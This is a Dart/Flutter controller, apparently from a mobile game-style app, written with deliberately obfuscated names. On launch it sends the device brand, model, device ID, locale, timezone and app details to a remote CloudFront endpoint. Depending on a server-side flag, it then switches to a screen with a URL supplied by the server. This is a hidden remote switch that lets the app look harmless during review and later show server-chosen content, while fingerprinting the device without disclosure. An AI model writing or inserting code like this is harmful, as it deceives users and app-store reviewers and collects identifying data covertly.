import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class SmileRoundLogic extends GetxController {

  var pvltwzj = RxBool(false);
  var dqotmj = RxBool(true);
  var rspqeji = RxString("");
  var nannie = RxBool(false);
  var cruickshank = RxBool(true);
  final auesfodt = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    avhezkw();
  }


  Future<void> avhezkw() async {
    nannie.value = true;
    cruickshank.value = true;
    dqotmj.value = false;

    auesfodt.post("https://d38dy09iics3qe.cloudfront.net/xzjimftwnedcu",data: await yawxenj()).then((value) {
      var jcqghusz = value.data["jcqghusz"] as String;
      var trgmud = value.data["trgmud"] as bool;
      if (trgmud) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        rspqeji.value = jcqghusz;
        justice();
      } else {
        medhurst();
      }
    }).catchError((e) {
      dqotmj.value = true;
      cruickshank.value = true;
      nannie.value = false;
    });
  }

  Future<Map<String, dynamic>> yawxenj() async {
    final DeviceInfoPlugin zcsu = DeviceInfoPlugin();
    PackageInfo svwjuotm_tusm = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var rklwv = Platform.localeName;
    var ap_irylNvV = currentTimeZone;

    var ap_VHLyAdB = svwjuotm_tusm.packageName;
    var ap_arjAxve = svwjuotm_tusm.version;
    var ap_YCspRxd = svwjuotm_tusm.buildNumber;

    var ap_XqP = svwjuotm_tusm.appName;
    var ap_kXGanqC = "";
    var ap_SjcBmnu  = "";
    var ap_vUD = "";
    var vinnieKuhn = "";
    var leraSchowalter = "";
    var frederiqueSchinner = "";
    var nicholausMoore = "";
    var angelitaBeier = "";
    var carolineMcGlynn = "";
    var judsonBraun = "";
    var fernandoBraun = "";


    var ap_TLSkxy = "";
    var ap_ofe = false;

    if (GetPlatform.isAndroid) {
      ap_TLSkxy = "android";
      var yrgfshl = await zcsu.androidInfo;

      ap_vUD = yrgfshl.brand;

      ap_kXGanqC  = yrgfshl.model;
      ap_SjcBmnu = yrgfshl.id;

      ap_ofe = yrgfshl.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ap_TLSkxy = "ios";
      var npjfdlb = await zcsu.iosInfo;
      ap_vUD = npjfdlb.name;
      ap_kXGanqC = npjfdlb.model;

      ap_SjcBmnu = npjfdlb.identifierForVendor ?? "";
      ap_ofe  = npjfdlb.isPhysicalDevice;
    }
    var res = {
      "ap_YCspRxd": ap_YCspRxd,
      "frederiqueSchinner" : frederiqueSchinner,
      "ap_arjAxve": ap_arjAxve,
      "ap_VHLyAdB": ap_VHLyAdB,
      "ap_irylNvV": ap_irylNvV,
      "ap_vUD": ap_vUD,
      "ap_SjcBmnu": ap_SjcBmnu,
      "nicholausMoore" : nicholausMoore,
      "rklwv": rklwv,
      "ap_TLSkxy": ap_TLSkxy,
      "ap_XqP": ap_XqP,
      "vinnieKuhn" : vinnieKuhn,
      "leraSchowalter" : leraSchowalter,
      "angelitaBeier" : angelitaBeier,
      "carolineMcGlynn" : carolineMcGlynn,
      "judsonBraun" : judsonBraun,
      "ap_ofe": ap_ofe,
      "ap_kXGanqC": ap_kXGanqC,
      "fernandoBraun" : fernandoBraun,

    };
    return res;
  }

  Future<void> medhurst() async {
    Get.offNamed("/smile_init");
  }

  Future<void> justice() async {
    Get.offNamed("/smile_change");
  }

}
